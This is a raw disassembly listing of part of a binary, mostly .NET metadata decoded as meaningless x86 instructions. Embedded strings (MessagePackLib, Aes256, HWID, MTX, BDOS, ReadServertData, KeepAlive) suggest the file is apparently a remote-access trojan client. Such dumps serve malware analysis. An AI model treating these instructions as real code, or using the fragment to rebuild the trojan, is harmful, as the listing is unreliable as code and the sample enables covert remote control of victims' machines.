  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 28                	add    %ch,(%eax)
  407705:	0f 1b 0f             	bndstx %bnd1,(%edi)
  407708:	33 0f                	xor    (%edi),%ecx
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	06                   	push   %es
  40771b:	1c 01                	sbb    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	f1                   	int1
  407723:	1b 01                	sbb    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	ef                   	out    %eax,(%dx)
  40772b:	05 02 00 41 01       	add    $0x1410002,%eax
  407730:	77 00                	ja     0x407732
  407732:	07                   	pop    %es
  407733:	1b 02                	sbb    (%edx),%eax
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	c3                   	ret
  40773b:	08 02                	or     %al,(%edx)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	84 0e                	test   %cl,(%esi)
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	12 00                	adc    (%eax),%al
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	c1 02 00             	roll   $0x0,(%edx)
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	f4                   	hlt
  40778b:	0f 00 00             	sldt   (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 da                	add    %bl,%dl
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	4b                   	dec    %ebx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e5                	add    %ah,%ch
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 85 1a 00 00 00    	add    %al,0x1a(%ebp)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	ac                   	lods   %ds:(%esi),%al
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 9b 12 00 00 00    	add    %bl,0x12(%ebx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	34 66                	xor    $0x66,%al
  407830:	72 66                	jb     0x407898
  407832:	6e                   	outsb  %ds:(%esi),(%dx)
  407833:	6a 34                	push   $0x34
  407835:	31 00                	xor    %eax,(%eax)
  407837:	49                   	dec    %ecx
  407838:	45                   	inc    %ebp
  407839:	6e                   	outsb  %ds:(%esi),(%dx)
  40783a:	75 6d                	jne    0x4078a9
  40783c:	65 72 61             	gs jb  0x4078a0
  40783f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407843:	31 00                	xor    %eax,(%eax)
  407845:	43                   	inc    %ebx
  407846:	61                   	popa
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	6c                   	insb   (%dx),%es:(%edi)
  407849:	53                   	push   %ebx
  40784a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407851:	69 
  407852:	73 74                	jae    0x4078c8
  407854:	60                   	pusha
  407855:	31 00                	xor    %eax,(%eax)
  407857:	61                   	popa
  407858:	31 00                	xor    %eax,(%eax)
  40785a:	76 31                	jbe    0x40788d
  40785c:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785f:	53                   	push   %ebx
  407860:	74 61                	je     0x4078c3
  407862:	74 69                	je     0x4078cd
  407864:	63 41 72             	arpl   %eax,0x72(%ecx)
  407867:	72 61                	jb     0x4078ca
  407869:	79 49                	jns    0x4078b4
  40786b:	6e                   	outsb  %ds:(%esi),(%dx)
  40786c:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407873:	69 
  407874:	7a 65                	jp     0x4078db
  407876:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407882:	74 2e                	je     0x4078b2
  407884:	57                   	push   %edi
  407885:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 33                	je     0x4078c4
  407891:	32 00                	xor    (%eax),%al
  407893:	54                   	push   %esp
  407894:	6f                   	outsl  %ds:(%esi),(%dx)
  407895:	49                   	dec    %ecx
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 33                	je     0x4078cc
  407899:	32 00                	xor    (%eax),%al
  40789b:	53                   	push   %ebx
  40789c:	77 61                	ja     0x4078ff
  40789e:	70 49                	jo     0x4078e9
  4078a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a1:	74 33                	je     0x4078d6
  4078a3:	32 00                	xor    (%eax),%al
  4078a5:	3c 3e                	cmp    $0x3e,%al
  4078a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a8:	5f                   	pop    %edi
  4078a9:	5f                   	pop    %edi
  4078aa:	32 00                	xor    (%eax),%al
  4078ac:	61                   	popa
  4078ad:	32 00                	xor    (%eax),%al
  4078af:	58                   	pop    %eax
  4078b0:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b5:	72 74                	jb     0x40792b
  4078b7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078be:	32 00                	xor    (%eax),%al
  4078c0:	76 32                	jbe    0x4078f4
  4078c2:	00 76 33             	add    %dh,0x33(%esi)
  4078c5:	00 57 72             	add    %dl,0x72(%edi)
  4078c8:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078cf:	36 
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	54                   	push   %esp
  4078d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d4:	55                   	push   %ebp
  4078d5:	49                   	dec    %ecx
  4078d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d7:	74 36                	je     0x40790f
  4078d9:	34 00                	xor    $0x0,%al
  4078db:	47                   	inc    %edi
  4078dc:	65 74 41             	gs je  0x407920
  4078df:	73 55                	jae    0x407936
  4078e1:	49                   	dec    %ecx
  4078e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e3:	74 36                	je     0x40791b
  4078e5:	34 00                	xor    $0x0,%al
  4078e7:	53                   	push   %ebx
  4078e8:	65 74 41             	gs je  0x40792c
  4078eb:	73 55                	jae    0x407942
  4078ed:	49                   	dec    %ecx
  4078ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ef:	74 36                	je     0x407927
  4078f1:	34 00                	xor    $0x0,%al
  4078f3:	54                   	push   %esp
  4078f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f5:	49                   	dec    %ecx
  4078f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f7:	74 36                	je     0x40792f
  4078f9:	34 00                	xor    $0x0,%al
  4078fb:	53                   	push   %ebx
  4078fc:	77 61                	ja     0x40795f
  4078fe:	70 49                	jo     0x407949
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 36                	je     0x407939
  407903:	34 00                	xor    $0x0,%al
  407905:	54                   	push   %esp
  407906:	6f                   	outsl  %ds:(%esi),(%dx)
  407907:	55                   	push   %ebp
  407908:	49                   	dec    %ecx
  407909:	6e                   	outsb  %ds:(%esi),(%dx)
  40790a:	74 31                	je     0x40793d
  40790c:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407911:	6e                   	outsb  %ds:(%esi),(%dx)
  407912:	74 31                	je     0x407945
  407914:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407918:	61                   	popa
  407919:	70 49                	jo     0x407964
  40791b:	6e                   	outsb  %ds:(%esi),(%dx)
  40791c:	74 31                	je     0x40794f
  40791e:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407922:	41                   	inc    %ecx
  407923:	43                   	inc    %ebx
  407924:	53                   	push   %ebx
  407925:	48                   	dec    %eax
  407926:	41                   	inc    %ecx
  407927:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40792d:	61                   	popa
  40792e:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407934:	73 32                	jae    0x407968
  407936:	35 36 00 61 65       	xor    $0x65610036,%eax
  40793b:	73 32                	jae    0x40796f
  40793d:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407942:	53                   	push   %ebx
  407943:	74 61                	je     0x4079a6
  407945:	74 69                	je     0x4079b0
  407947:	63 41 72             	arpl   %eax,0x72(%ecx)
  40794a:	72 61                	jb     0x4079ad
  40794c:	79 49                	jns    0x407997
  40794e:	6e                   	outsb  %ds:(%esi),(%dx)
  40794f:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407956:	69 
  407957:	7a 65                	jp     0x4079be
  407959:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40795e:	74 5f                	je     0x4079bf
  407960:	55                   	push   %ebp
  407961:	54                   	push   %esp
  407962:	46                   	inc    %esi
  407963:	38 00                	cmp    %al,(%eax)
  407965:	3c 4d                	cmp    $0x4d,%al
  407967:	6f                   	outsl  %ds:(%esi),(%dx)
  407968:	64 75 6c             	fs jne 0x4079d7
  40796b:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407970:	73 73                	jae    0x4079e5
  407972:	61                   	popa
  407973:	67 65 50             	addr16 gs push %eax
  407976:	61                   	popa
  407977:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  40797a:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407981:	76 61                	jbe    0x4079e4
  407983:	74 65                	je     0x4079ea
  407985:	49                   	dec    %ecx
  407986:	6d                   	insl   (%dx),%es:(%edi)
  407987:	70 6c                	jo     0x4079f5
  407989:	65 6d                	gs insl (%dx),%es:(%edi)
  40798b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798d:	74 61                	je     0x4079f0
  40798f:	74 69                	je     0x4079fa
  407991:	6f                   	outsl  %ds:(%esi),(%dx)
  407992:	6e                   	outsb  %ds:(%esi),(%dx)
  407993:	44                   	inc    %esp
  407994:	65 74 61             	gs je  0x4079f8
  407997:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799e:	42 
  40799f:	32 41 31             	xor    0x31(%ecx),%al
  4079a2:	46                   	inc    %esi
  4079a3:	39 39                	cmp    %edi,(%ecx)
  4079a5:	30 32                	xor    %dh,(%edx)
  4079a7:	42                   	inc    %edx
  4079a8:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ae:	38 30                	cmp    %dh,(%eax)
  4079b0:	45                   	inc    %ebp
  4079b1:	46                   	inc    %esi
  4079b2:	31 36                	xor    %esi,(%esi)
  4079b4:	39 32                	cmp    %esi,(%edx)
  4079b6:	43                   	inc    %ebx
  4079b7:	45                   	inc    %ebp
  4079b8:	39 39                	cmp    %edi,(%ecx)
  4079ba:	34 37                	xor    $0x37,%al
  4079bc:	41                   	inc    %ecx
  4079bd:	31 39                	xor    %edi,(%ecx)
  4079bf:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c3:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c6:	44                   	inc    %esp
  4079c7:	38 46 35             	cmp    %al,0x35(%esi)
  4079ca:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079ce:	41                   	inc    %ecx
  4079cf:	37                   	aaa
  4079d0:	32 31                	xor    (%ecx),%dh
  4079d2:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d8:	43                   	inc    %ebx
  4079d9:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079de:	43                   	inc    %ebx
  4079df:	00 45 53             	add    %al,0x53(%ebp)
  4079e2:	5f                   	pop    %edi
  4079e3:	53                   	push   %ebx
  4079e4:	59                   	pop    %ecx
  4079e5:	53                   	push   %ebx
  4079e6:	54                   	push   %esp
  4079e7:	45                   	inc    %ebp
  4079e8:	4d                   	dec    %ebp
  4079e9:	5f                   	pop    %edi
  4079ea:	52                   	push   %edx
  4079eb:	45                   	inc    %ebp
  4079ec:	51                   	push   %ecx
  4079ed:	55                   	push   %ebp
  4079ee:	49                   	dec    %ecx
  4079ef:	52                   	push   %edx
  4079f0:	45                   	inc    %ebp
  4079f1:	44                   	inc    %esp
  4079f2:	00 45 53             	add    %al,0x53(%ebp)
  4079f5:	5f                   	pop    %edi
  4079f6:	44                   	inc    %esp
  4079f7:	49                   	dec    %ecx
  4079f8:	53                   	push   %ebx
  4079f9:	50                   	push   %eax
  4079fa:	4c                   	dec    %esp
  4079fb:	41                   	inc    %ecx
  4079fc:	59                   	pop    %ecx
  4079fd:	5f                   	pop    %edi
  4079fe:	52                   	push   %edx
  4079ff:	45                   	inc    %ebp
  407a00:	51                   	push   %ecx
  407a01:	55                   	push   %ebp
  407a02:	49                   	dec    %ecx
  407a03:	52                   	push   %edx
  407a04:	45                   	inc    %ebp
  407a05:	44                   	inc    %esp
  407a06:	00 4d 61             	add    %cl,0x61(%ebp)
  407a09:	70 4e                	jo     0x407a59
  407a0b:	61                   	popa
  407a0c:	6d                   	insl   (%dx),%es:(%edi)
  407a0d:	65 54                	gs push %esp
  407a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a10:	4f                   	dec    %edi
  407a11:	49                   	dec    %ecx
  407a12:	44                   	inc    %esp
  407a13:	00 48 57             	add    %cl,0x57(%eax)
  407a16:	49                   	dec    %ecx
  407a17:	44                   	inc    %esp
  407a18:	00 67 65             	add    %ah,0x65(%edi)
  407a1b:	74 5f                	je     0x407a7c
  407a1d:	46                   	inc    %esi
  407a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1f:	72 6d                	jb     0x407a8e
  407a21:	61                   	popa
  407a22:	74 49                	je     0x407a6d
  407a24:	44                   	inc    %esp
  407a25:	00 45 58             	add    %al,0x58(%ebp)
  407a28:	45                   	inc    %ebp
  407a29:	43                   	inc    %ebx
  407a2a:	55                   	push   %ebp
  407a2b:	54                   	push   %esp
  407a2c:	49                   	dec    %ecx
  407a2d:	4f                   	dec    %edi
  407a2e:	4e                   	dec    %esi
  407a2f:	5f                   	pop    %edi
  407a30:	53                   	push   %ebx
  407a31:	54                   	push   %esp
  407a32:	41                   	inc    %ecx
  407a33:	54                   	push   %esp
  407a34:	45                   	inc    %ebp
  407a35:	00 38                	add    %bh,(%eax)
  407a37:	37                   	aaa
  407a38:	36 33 39             	xor    %ss:(%ecx),%edi
  407a3b:	31 32                	xor    %esi,(%edx)
  407a3d:	36 45                	ss inc %ebp
  407a3f:	41                   	inc    %ecx
  407a40:	37                   	aaa
  407a41:	37                   	aaa
  407a42:	42                   	inc    %edx
  407a43:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a49:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4e:	37                   	aaa
  407a4f:	44                   	inc    %esp
  407a50:	42                   	inc    %edx
  407a51:	41                   	inc    %ecx
  407a52:	36 37                	ss aaa
  407a54:	43                   	inc    %ebx
  407a55:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a5a:	46                   	inc    %esi
  407a5b:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a60:	39 38                	cmp    %edi,(%eax)
  407a62:	38 38                	cmp    %bh,(%eax)
  407a64:	45                   	inc    %ebp
  407a65:	44                   	inc    %esp
  407a66:	30 37                	xor    %dh,(%edi)
  407a68:	30 43 44             	xor    %al,0x44(%ebx)
  407a6b:	34 30                	xor    $0x30,%al
  407a6d:	45                   	inc    %ebp
  407a6e:	31 46 36             	xor    %eax,0x36(%esi)
  407a71:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a77:	67 65 74 5f          	addr16 gs je 0x407ada
  407a7b:	41                   	inc    %ecx
  407a7c:	53                   	push   %ebx
  407a7d:	43                   	inc    %ebx
  407a7e:	49                   	dec    %ecx
  407a7f:	49                   	dec    %ecx
  407a80:	00 53 79             	add    %dl,0x79(%ebx)
  407a83:	73 74                	jae    0x407af9
  407a85:	65 6d                	gs insl (%dx),%es:(%edi)
  407a87:	2e 49                	cs dec %ecx
  407a89:	4f                   	dec    %edi
  407a8a:	00 49 73             	add    %cl,0x73(%ecx)
  407a8d:	58                   	pop    %eax
  407a8e:	50                   	push   %eax
  407a8f:	00 42 44             	add    %al,0x44(%edx)
  407a92:	4f                   	dec    %edi
  407a93:	53                   	push   %ebx
  407a94:	00 45 53             	add    %al,0x53(%ebp)
  407a97:	5f                   	pop    %edi
  407a98:	43                   	inc    %ebx
  407a99:	4f                   	dec    %edi
  407a9a:	4e                   	dec    %esi
  407a9b:	54                   	push   %esp
  407a9c:	49                   	dec    %ecx
  407a9d:	4e                   	dec    %esi
  407a9e:	55                   	push   %ebp
  407a9f:	4f                   	dec    %edi
  407aa0:	55                   	push   %ebp
  407aa1:	53                   	push   %ebx
  407aa2:	00 67 65             	add    %ah,0x65(%edi)
  407aa5:	74 5f                	je     0x407b06
  407aa7:	49                   	dec    %ecx
  407aa8:	56                   	push   %esi
  407aa9:	00 73 65             	add    %dh,0x65(%ebx)
  407aac:	74 5f                	je     0x407b0d
  407aae:	49                   	dec    %ecx
  407aaf:	56                   	push   %esi
  407ab0:	00 47 65             	add    %al,0x65(%edi)
  407ab3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab4:	65 72 61             	gs jb  0x407b18
  407ab7:	74 65                	je     0x407b1e
  407ab9:	49                   	dec    %ecx
  407aba:	56                   	push   %esi
  407abb:	00 4d 54             	add    %cl,0x54(%ebp)
  407abe:	58                   	pop    %eax
  407abf:	00 76 61             	add    %dh,0x61(%esi)
  407ac2:	6c                   	insb   (%dx),%es:(%edi)
  407ac3:	75 65                	jne    0x407b2a
  407ac5:	5f                   	pop    %edi
  407ac6:	5f                   	pop    %edi
  407ac7:	00 52 65             	add    %dl,0x65(%edx)
  407aca:	61                   	popa
  407acb:	64 53                	fs push %ebx
  407acd:	65 72 76             	gs jb  0x407b46
  407ad0:	65 72 74             	gs jb  0x407b47
  407ad3:	44                   	inc    %esp
  407ad4:	61                   	popa
  407ad5:	74 61                	je     0x407b38
  407ad7:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407adb:	61                   	popa
  407adc:	00 6d 73             	add    %ch,0x73(%ebp)
  407adf:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae2:	6c                   	insb   (%dx),%es:(%edi)
  407ae3:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407aea:	65 6d                	gs insl (%dx),%es:(%edi)
  407aec:	2e 43                	cs inc %ebx
  407aee:	6f                   	outsl  %ds:(%esi),(%dx)
  407aef:	6c                   	insb   (%dx),%es:(%edi)
  407af0:	6c                   	insb   (%dx),%es:(%edi)
  407af1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af6:	6e                   	outsb  %ds:(%esi),(%dx)
  407af7:	73 2e                	jae    0x407b27
  407af9:	47                   	inc    %edi
  407afa:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afc:	65 72 69             	gs jb  0x407b68
  407aff:	63 00                	arpl   %eax,(%eax)
  407b01:	4d                   	dec    %ebp
  407b02:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b09:	74 2e                	je     0x407b39
  407b0b:	56                   	push   %esi
  407b0c:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b13:	73 69                	jae    0x407b7e
  407b15:	63 00                	arpl   %eax,(%eax)
  407b17:	67 65 74 5f          	addr16 gs je 0x407b7a
  407b1b:	53                   	push   %ebx
  407b1c:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1e:	64 53                	fs push %ebx
  407b20:	79 6e                	jns    0x407b90
  407b22:	63 00                	arpl   %eax,(%eax)
  407b24:	45                   	inc    %ebp
  407b25:	6e                   	outsb  %ds:(%esi),(%dx)
  407b26:	64 52                	fs push %edx
  407b28:	65 61                	gs popa
  407b2a:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2e:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b35:	00 
  407b36:	54                   	push   %esp
  407b37:	68 72 65 61 64       	push   $0x64616572
  407b3c:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b40:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b44:	6e                   	outsb  %ds:(%esi),(%dx)
  407b45:	65 72 41             	gs jb  0x407b89
  407b48:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4d:	41                   	inc    %ecx
  407b4e:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b54:	61                   	popa
  407b55:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5b:	74 5f                	je     0x407bbc
  407b5d:	43                   	inc    %ebx
  407b5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b60:	6e                   	outsb  %ds:(%esi),(%dx)
  407b61:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b66:	00 67 65             	add    %ah,0x65(%edi)
  407b69:	74 5f                	je     0x407bca
  407b6b:	49                   	dec    %ecx
  407b6c:	73 43                	jae    0x407bb1
  407b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	6e                   	outsb  %ds:(%esi),(%dx)
  407b71:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b76:	00 73 65             	add    %dh,0x65(%ebx)
  407b79:	74 5f                	je     0x407bda
  407b7b:	49                   	dec    %ecx
  407b7c:	73 43                	jae    0x407bc1
  407b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	6e                   	outsb  %ds:(%esi),(%dx)
  407b81:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b86:	00 52 65             	add    %dl,0x65(%edx)
  407b89:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8c:	76 65                	jbe    0x407bf3
  407b8e:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b92:	74 5f                	je     0x407bf3
  407b94:	47                   	inc    %edi
  407b95:	75 69                	jne    0x407c00
  407b97:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9b:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba2:	64 
  407ba3:	53                   	push   %ebx
  407ba4:	79 6e                	jns    0x407c14
  407ba6:	63 3e                	arpl   %edi,(%esi)
  407ba8:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bac:	61                   	popa
  407bad:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bb0:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb1:	67 46                	addr16 inc %esi
  407bb3:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bba:	73 43                	jae    0x407bff
  407bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbe:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbf:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc4:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc9:	61                   	popa
  407bca:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bce:	67 46                	addr16 inc %esi
  407bd0:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd7:	65 65 70 41          	gs gs jo 0x407c1c
  407bdb:	6c                   	insb   (%dx),%es:(%edi)
  407bdc:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be3:	42                   	inc    %edx
  407be4:	61                   	popa
  407be5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be8:	6e                   	outsb  %ds:(%esi),(%dx)
  407be9:	67 46                	addr16 inc %esi
  407beb:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf2:	65 61                	gs popa
  407bf4:	64 65 72 53          	fs gs jb 0x407c4b
  407bf8:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bff:	42                   	inc    %edx
